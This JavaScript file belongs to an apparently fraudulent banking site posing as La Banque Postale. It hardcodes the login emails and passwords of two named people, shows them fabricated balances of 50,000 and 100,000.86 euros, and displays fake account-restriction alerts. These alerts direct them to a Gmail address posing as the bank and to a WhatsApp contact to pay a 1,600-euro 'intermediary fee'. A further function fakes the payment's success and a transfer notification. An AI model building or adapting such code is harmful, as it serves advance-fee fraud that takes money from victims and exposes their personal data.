function openModal(modalId) {
    const modal = document.getElementById(modalId);
    if(modal) {
      modal.style.display = 'block';
      document.body.style.overflow = 'hidden'; // Prevent scrolling when modal is open
    }
}

function closeModal(modalId) {
    const modal = document.getElementById(modalId);
    if(modal) {
        modal.style.display = 'none';
        document.body.style.overflow = ''; // Restore scrolling
    }
}

function showDashboard() {
    document.querySelector('.promo-section').style.display = 'none'; // Hide the new promo section
    document.querySelector('.services-section').style.display = 'none';
    document.querySelector('.contact-section').style.display = 'none';
    document.querySelector('.dashboard').style.display = 'block';
    // Ensure smooth scroll is enabled for the whole document if needed
    document.documentElement.style.scrollBehavior = 'smooth';
    document.body.style.scrollBehavior = 'smooth'; // For Safari and older browsers

    // Hide the login/register buttons in the header
    const btnRegister = document.getElementById('btnRegisterHeader');
    const btnLogin = document.getElementById('btnLoginHeader');
    if (btnRegister) btnRegister.style.display = 'none';
    if (btnLogin) btnLogin.style.display = 'none';
}

function updateDashboard(userName, balance, transactions) {
    document.getElementById('dashboardUserName').innerText = 'Bonjour ' + userName;
    document.getElementById('dashboardBalance').innerText = balance + ' €';
    
    const transactionListEl = document.getElementById('transactionList');
    transactionListEl.innerHTML = ''; // Clear existing transactions
    
    transactions.forEach((tx, index) => {
        const li = document.createElement('li');
        li.style.padding = '10px 0';
        // No border on the last item
        if (index < transactions.length - 1) {
            li.style.borderBottom = '1px solid #eee';
        }
        
        li.innerHTML = `
            <strong>${tx.type}</strong><br>
            <small>${tx.date} - ${tx.amount}</small>
        `;
        transactionListEl.appendChild(li);
    });
}

function logout() {
    document.querySelector('.promo-section').style.display = 'flex'; // Show the new promo section
    document.querySelector('.services-section').style.display = 'block';
    document.querySelector('.contact-section').style.display = 'block';
    document.querySelector('.dashboard').style.display = 'none';
    // Reset scroll behavior if it was set explicitly for dashboard view
    document.documentElement.style.scrollBehavior = '';
    document.body.style.scrollBehavior = '';

    // Show the login/register buttons in the header
    const btnRegister = document.getElementById('btnRegisterHeader');
    const btnLogin = document.getElementById('btnLoginHeader');
    if (btnRegister) btnRegister.style.display = 'inline-block'; // Or 'block' depending on initial style
    if (btnLogin) btnLogin.style.display = 'inline-block'; // Or 'block' depending on initial style
}

// Function to simulate payment success and update dashboard (this function is no longer called automatically by "J'ai effectué le paiement" button)
function simulatePaymentSuccess() {
    // Simulate fee payment
    alert("Paiement de 1 600,00 € effectué avec succès. Votre virement est en cours de traitement.");

    // Update dashboard
    document.getElementById('dashboardBalance').innerText = '0,00 €';
    
    const transactionListEl = document.getElementById('transactionList');
    transactionListEl.innerHTML = ''; // Clear existing
    
    const transactions = [
        { type: 'Paiement des frais intermédiaires', date: '05/08/2025', amount: '-1 600,00 €' },
        { type: 'Virement émis vers compte Revolut', date: '05/08/2025', amount: '-100 000,86 €' },
        { type: 'Virement reçu de Mr Patrick Lapin', date: '31/07/2025', amount: '+100 000,86 €' },
    ];
    
    transactions.forEach((tx, index) => {
        const li = document.createElement('li');
        li.style.padding = '10px 0';
        if (index < transactions.length - 1) {
            li.style.borderBottom = '1px solid #eee';
        }
        li.innerHTML = `<strong>${tx.type}</strong><br><small>${tx.date} - ${tx.amount}</small>`;
        transactionListEl.appendChild(li);
    });

    // Hide restriction and payment prompt
    document.getElementById('accountRestrictionMessage').style.display = 'none';
    document.getElementById('paymentPrompt').style.display = 'none';
    
    // Simulate email notification
    setTimeout(() => {
        alert("Notification : Virement de 100 000,86 EUR crédité sur votre compte Revolut (IBAN FR76...539) le 5 août 2025.");
    }, 1000); // Delay alert to make it feel more real
}


document.addEventListener('DOMContentLoaded', () => {

    // Login form handler
    const loginForm = document.getElementById('loginForm');
    if (loginForm) {
        loginForm.addEventListener('submit', function(e) {
            e.preventDefault();
            const email = document.getElementById('loginEmail').value;
            const password = document.getElementById('loginPassword').value;
            
            if (email === 'chantremboungou6@gmail.com' && password === 'chantremboungou6') {
                updateDashboard(
                    'Madame Mboungou Chantre Flore',
                    '50 000,00',
                    [
                        { type: 'Virement reçu', date: '30/07/2025 - 11:29 AM', amount: '+50 000,00 €' },
                        { type: 'Prélèvement EDF', date: '14/12/2024', amount: '-89,50 €' },
                        { type: 'Virement émis', date: '13/12/2024', amount: '-450,00 €' }
                    ]
                );
                document.getElementById('accountRestrictionMessage').style.display = 'block';
                document.getElementById('paymentPrompt').style.display = 'none';
                document.querySelector('.account-restriction-message p').innerHTML = `<strong>Alerte :</strong> Votre compte est temporairement restreint en raison d'une non-authentification. Veuillez contacter <strong>labanquepostaleofficiel@gmail.com</strong> pour plus d'informations.`;
                closeModal('loginModal');
                showDashboard();
            } else if (email === 'freyjacqueline474@gmail.com' && password === 'freyjacqueline474') {
                updateDashboard(
                    'Madame Jacqueline Poety',
                    '100 000,86',
                    [
                        { type: 'Virement reçu de Mr Patrick Lapin', date: 'Reçu le 31 juillet 2025 à 18:58', amount: '+100 000,86 €' },
                    ]
                );
                
                const restrictionMessageEl = document.querySelector('.account-restriction-message p');
                // Updated message to include transfer status
                restrictionMessageEl.innerHTML = `<strong>Alerte :</strong> Votre virement de 100 000,86 € est en cours de migration d'initiation vers votre compte Revolut. Pour finaliser ce transfert et débloquer votre compte, une authentification est requise. Veuillez contacter <strong>labanquepostaleofficiel@gmail.com</strong> pour plus d'informations.`;
                
                document.getElementById('accountRestrictionMessage').style.display = 'block';
                document.getElementById('paymentPrompt').style.display = 'block';
                
                closeModal('loginModal');
                showDashboard();
            } else {
                alert('Identifiants incorrects. Veuillez réessayer.');
            }
        });
    }

    // Register form handler
    const registerForm = document.getElementById('registerForm');
    if (registerForm) {
        registerForm.addEventListener('submit', function(e) {
            e.preventDefault();
            
            // Save user data to localStorage
            const userData = {
                firstName: document.getElementById('registerFirstName').value,
                lastName: document.getElementById('registerLastName').value,
                email: document.getElementById('registerEmail').value,
                phone: document.getElementById('registerPhone').value,
                address: document.getElementById('registerAddress').value,
                password: document.getElementById('registerPassword').value
            };
            
            localStorage.setItem('userData', JSON.stringify(userData));
            
            alert('Compte créé avec succès ! Vous pouvez maintenant vous connecter.');
            closeModal('registerModal');
            openModal('loginModal');
        });
    }

    // Fee payment handler (modified to show WhatsApp modal)
    const payFeeButton = document.getElementById('payFeeButton');
    if (payFeeButton) {
        payFeeButton.addEventListener('click', () => {
            openModal('whatsappContactModal'); // Open the WhatsApp contact modal
        });
    }

    // "J'ai effectué le paiement" button handler inside WhatsApp modal
    const confirmPaymentButton = document.getElementById('confirmPaymentButton');
    if (confirmPaymentButton) {
        confirmPaymentButton.addEventListener('click', () => {
            closeModal('whatsappContactModal'); // Close the WhatsApp modal
        });
    }

    // Close modal when clicking outside
    window.onclick = function(event) {
        const modals = document.querySelectorAll('.modal');
        modals.forEach(modal => {
            if (event.target === modal) {
                modal.style.display = 'none';
                document.body.style.overflow = ''; // Restore scrolling
            }
        });
    }

    // Mobile menu toggle
    const mobileMenuToggle = document.querySelector('.mobile-menu-toggle');
    const navMenu = document.querySelector('.nav-menu');

    if (mobileMenuToggle && navMenu) {
        mobileMenuToggle.addEventListener('click', () => {
            navMenu.classList.toggle('active');
        });
    }

});

// Mobile menu toggle function (exposed globally for onclick attribute)
function toggleMobileMenu() {
    const navMenu = document.querySelector('.nav-menu');
    if (navMenu) {
        navMenu.classList.toggle('active');
    }
}